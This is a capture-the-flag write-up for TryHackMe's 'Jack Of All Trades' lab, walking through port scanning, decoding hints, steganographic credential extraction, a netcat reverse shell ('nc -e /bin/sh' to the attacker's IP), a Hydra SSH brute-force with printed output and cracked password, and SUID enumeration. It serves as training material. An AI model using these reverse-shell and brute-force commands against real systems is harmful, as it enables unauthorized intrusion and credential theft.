# TryHackMe-Jack Of All Trades

>Abdullah Rizwan | 08:17 PM , 1st November 2020

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-01 20:18 PKT
Nmap scan report for 10.10.103.231
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.76 seconds

```

## PORT 22

Noramlly this is default port 22 but in this case it is http if you visit it on firefox it has restricted default ports like ssh , ftp and etc so inorder to enable we have to go to browser's `about:config` and a property to override theses settings

https://support.mozilla.org/en-US/questions/1083282

<img src="https://imgur.com/rzMq2ks.png"/>


<img src="https://imgur.com/s6O5rAh.png"/>


And we can access the page now 

<img src="https://imgur.com/LdntB1r.png"/>

By looking at the source code

<img src="https://imgur.com/xb0DMC4.png"/>

We can find two things `/recovery.php` and a base64 encoded text


On decoding the text

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

user name john maybe


Download those images

<img src="https://imgur.com/B8Yflc3.png"/>


<img src="https://imgur.com/mFfLM5F.png"/>

By looking at the source code and login with `Jack` and `u?WtKSraq`

```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```
This is base32 encoded text on decoding it 

<img src="https://imgur.com/PNwkLcw.png"/>

```
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```

Now this is hex text on decoding it 

<img src="https://imgur.com/hInfNdO.png"/>

```
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
```

This is ROT 13 (Shift Cipher)

<img src="https://imgur.com/WmKeBxZ.png"/>

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

On visiting the link

<img src="https://imgur.com/WPPtesd.png"/>

Now its says about `Stegosauria` , now we recently downloaded two images on our machines ,so that dinosaur one looks interesting on using `steg hide --extract -sf [image.jpg]`

<img src="https://imgur.com/D8Dp9o2.png"/>

<img src="https://imgur.com/HL9DDof.png"/>

So this a rabbithole , lets steghide on different image , the second `jackinthebox.jpg` also didn't worked but when grabbed the `header.jpg` it worked

<img src="https://imgur.com/SNAzsSc.png"/>

```
 Username: jackinthebox
 Password: TplFxiSHjY 
```
However this is not the credentials for SSH 

<img src="https://imgur.com/vYObw7r.png"/>

Now this is a RCE execution we can run a reverse shell here

```
nc -e /bin/sh 10.14.3.143 4444

```
You can run any reverse shell you want but `netcat` one worked so lets roll with it

<img src="https://imgur.com/bXY0z0b.png"/>

Now we are `www-data` can't run really do much so lets try to elevate our privileges,so lets enumerate the machine , upload `linepeas`

<img src="https://imgur.com/1bwVyii.png"/>

Linpeas didn't find anyhting useful so there is a file in `~` home directory `jacks_password_list`

<img src="https://imgur.com/j95luIi.png"/>

## Hydra

Now we need to specify the port number becasue it's not on port 22

```
hydra -s 80 -l jack -P password_list.txt ssh://10.10.103.231 -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-01 21:49:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.103.231:80/
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "*hclqAzj+2GC+=0K" - 1 of 24 [child 0] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "eN<A@n^zI?FE$I5," - 2 of 24 [child 1] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "X<(@zo2XrEN)#MGC" - 3 of 24 [child 2] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass ",,aE1K,nW3Os,afb" - 4 of 24 [child 3] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "ITMJpGGIqg1jn?>@" - 5 of 24 [child 4] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "0HguX{,fgXPE;8yF" - 6 of 24 [child 5] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "sjRUb4*@pz<*ZITu" - 7 of 24 [child 6] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "[8V7o^gl(Gjt5[WB" - 8 of 24 [child 7] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "yTq0jI$d}Ka<T}PD" - 9 of 24 [child 8] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "Sc.[[2pL<>e)vC4}" - 10 of 24 [child 9] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "9;}#q*,A4wd{<X.T" - 11 of 24 [child 10] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "M41nrFt#PcV=(3%p" - 12 of 24 [child 11] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "GZx.t)H$&awU;SO<" - 13 of 24 [child 12] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass ".MVettz]a;&Z;cAC" - 14 of 24 [child 13] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "2fh%i9Pr5YiYIf51" - 15 of 24 [child 14] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "TDF@mdEd3ZQ(]hBO" - 16 of 24 [child 15] (0/0)
[ATTEMPT] target 10.10.103.231 - login "jack" - pass "v]XBmwAk8vk5t3EF" - 17 of 25 [child 13] (0/1)
[80][ssh] host: 10.10.103.231   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-01 21:49:54

```

<img src="https://imgur.com/aT4gtfl.png"/>

Using netcat to get that image on our local machine

<img src="https://imgur.com/DgS4vMh.png"/>

<img src="https://imgur.com/agCAuvB.png"/>

This is our user flag

Check for SUID 

```

jack@jack-of-all-trades:~$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ 
```

<img src="https://imgur.com/xWUCjwT.png"/>

